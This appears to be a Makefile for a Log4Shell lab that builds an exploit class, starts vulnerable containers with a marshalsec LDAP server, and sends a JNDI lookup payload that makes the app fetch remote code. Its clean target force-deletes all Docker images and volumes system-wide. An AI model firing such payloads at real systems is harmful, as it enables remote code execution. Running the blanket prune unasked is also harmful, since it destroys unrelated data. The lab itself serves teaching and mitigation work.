.PHONY: all run curl logs test mitigate rerun retest clean

# === Default: Full workflow
all: run curl logs test mitigate rerun retest clean

# === Compile Exploit.java and Start Docker containers
run:
	@echo "[*] Compiling Exploit.java and Starting Docker containers in foreground..."
	javac exploit/Exploit.java
	docker compose -f docker-compose.yml up --build

# === Send exploit payload
curl:
	@echo "[*] Sending JNDI exploit payload to the app..."
	sleep 3
	curl -X POST http://localhost:8080/api/log \
		-H "Content-Type: text/plain" \
		-d '$${jndi:ldap://host.docker.internal:1389/a}'

# === View logs
logs:
	@echo "[*] Tailing app logs (Ctrl+C to stop)..."
	docker compose logs -f app
	docker compose logs -f ldap-marshalsec
	docker compose logs -f http-server

# === Run exploit test
test:
	@echo "[*] Running exploit test..."
	@if [ ! -f exploit/Exploit.class ]; then \
		echo "❌ Exploit.class not found! Run 'make build' first."; exit 1; \
	fi
	@curl -X POST http://localhost:8080/api/log \
		-H "Content-Type: text/plain" \
		-d '$${jndi:ldap://host.docker.internal:1389/a}'
	
# === Apply Log4Shell mitigation using patch script and patched controller
mitigate:
	@echo "[*] Applying mitigation scripts..."
	chmod +x scripts/patch_log4j.sh
	./scripts/patch_log4j.sh
	cp patches/LogController.java src/main/java/com/example/LogController.java
	@echo "[✓] Mitigation applied successfully."


# === Rerun full app
rerun:
	@echo "[*] Rebuilding and restarting containers..."
	mvn clean package -DskipTests
	docker compose down -v
	docker compose -f docker-compose.yml up --build

# === Retest the exploit
retest: test

# === Restore original vulnerable Log4j setup
unmitigate:
	@echo "[*] Reverting to vulnerable Log4j setup..."
	sed -i 's/<version>2\.17\.0<\/version>/<version>2.14.1<\/version>/g' pom.xml
	cp patches/LogController.java src/main/java/com/example/LogController.java
	@echo "[✓] Reverted to vulnerable configuration."

# === Clean environment
clean: 
	@echo "[*] Cleaning up compiled class files and Docker system..."
	rm -f exploit/Exploit.class
	docker compose down -v
	@docker rmi -f $$(docker images -aq) 2>/dev/null || echo "No images to remove"
	docker system prune -a --volumes -f
